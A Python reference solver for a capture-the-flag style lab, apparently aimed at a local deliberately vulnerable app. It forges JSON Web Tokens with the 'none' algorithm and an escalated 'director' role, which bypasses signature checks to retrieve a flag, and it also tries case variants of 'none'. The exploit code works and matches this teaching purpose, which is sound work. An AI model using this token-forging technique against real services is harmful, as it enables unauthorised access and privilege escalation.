#!/usr/bin/env python3
"""Masquerade Operation 04 reference solver -- Kali forges a token nobody signed.

WSTG-SESS-10: Testing JSON Web Tokens, "none" algorithm variant. A JWT's header
tells the verifier HOW to check the signature -- but the header is just base64url,
attacker-controlled exactly like every other part of the token. If the verifier
trusts that field instead of enforcing one fixed algorithm, an attacker can set
alg to "none" and the verifier will skip the signature check entirely, trusting
whatever claims sit in the payload.

Unlike Ops 02 and 03, this one needs no victim at all -- nobody else's password,
nobody else's browser, nobody else's click. The attacker manufactures a fully
"valid" credential from nothing.

Usage: python3 solver.py [base_url]     (default http://localhost:8000)
"""
import sys, base64, json, requests, re

BASE = (sys.argv[1] if len(sys.argv) > 1 else "http://localhost:8000").rstrip("/")
USER = "retreat.member"
PASSWORD = "Chalet2024!"
DIRECTOR_ROLE = "director"


def b64url_encode(data: bytes) -> str:
    return base64.urlsafe_b64encode(data).rstrip(b"=").decode()


def b64url_decode(s: str) -> bytes:
    return base64.urlsafe_b64decode(s + "=" * (-len(s) % 4))


def main():
    print(f"[*] Logging in as the provided test account ({USER}) to get a real token")
    r = requests.post(f"{BASE}/masquerade/op4/login", data={"username": USER, "password": PASSWORD})
    token = re.search(r'select-all">([^<]+)<', r.text).group(1).strip()
    print(f"    token: {token}")

    h_b64, p_b64, _sig = token.split(".")
    header = json.loads(b64url_decode(h_b64))
    payload = json.loads(b64url_decode(p_b64))
    print(f"    decoded header:  {header}")
    print(f"    decoded payload: {payload}   <- just base64, no key needed to read this")

    print(f"\n[*] Confirming the real token, presented honestly, is NOT the director role")
    r_baseline = requests.get(f"{BASE}/masquerade/op4/ledger", headers={"Authorization": f"Bearer {token}"})
    print(f"    ledger says: {r_baseline.json()} (expected role={payload['role']!r}, no flag)")

    print(f"\n[*] Forging a token: alg -> none, role -> {DIRECTOR_ROLE!r}, signature -> empty")
    forged_header = b64url_encode(json.dumps({"typ": "JWT", "alg": "none"}).encode())
    forged_payload = b64url_encode(json.dumps({"sub": "kali", "role": DIRECTOR_ROLE, "iat": 1}).encode())
    forged_token = f"{forged_header}.{forged_payload}."   # trailing dot -- signature segment is empty
    print(f"    forged token: {forged_token}")

    print(f"\n[*] Presenting the forged token exactly like a real client would --")
    print(f"    Authorization: Bearer <token>, no signing key involved anywhere")
    r2 = requests.get(f"{BASE}/masquerade/op4/ledger", headers={"Authorization": f"Bearer {forged_token}"})
    data = r2.json()
    if data.get("flag"):
        print(f"[+] {data['flag']}")
    else:
        print(f"[!] forged token was not accepted: {data}")

    print("\n[*] Sanity check -- a tampered HS256 token (stale signature) must be rejected")
    tampered_payload = dict(payload, role=DIRECTOR_ROLE)
    tampered_p_b64 = b64url_encode(json.dumps(tampered_payload).encode())
    tampered_token = f"{h_b64}.{tampered_p_b64}.{_sig}"     # old sig, new payload -- mismatch
    r3 = requests.get(f"{BASE}/masquerade/op4/ledger", headers={"Authorization": f"Bearer {tampered_token}"})
    print(f"    rejected (no flag, no 200 'ok' with director role): {r3.json().get('role') != DIRECTOR_ROLE or 'error' in r3.json()}")

    print("\n[*] Sanity check -- case variants of 'none' must ALSO be accepted (real bypass, not a fluke)")
    for variant in ("None", "NONE", "nOnE"):
        h = b64url_encode(json.dumps({"typ": "JWT", "alg": variant}).encode())
        tok = f"{h}.{forged_payload}."
        r4 = requests.get(f"{BASE}/masquerade/op4/ledger", headers={"Authorization": f"Bearer {tok}"})
        print(f"    alg={variant!r}: {'accepted' if r4.json().get('flag') else 'rejected'}")


if __name__ == "__main__":
    main()
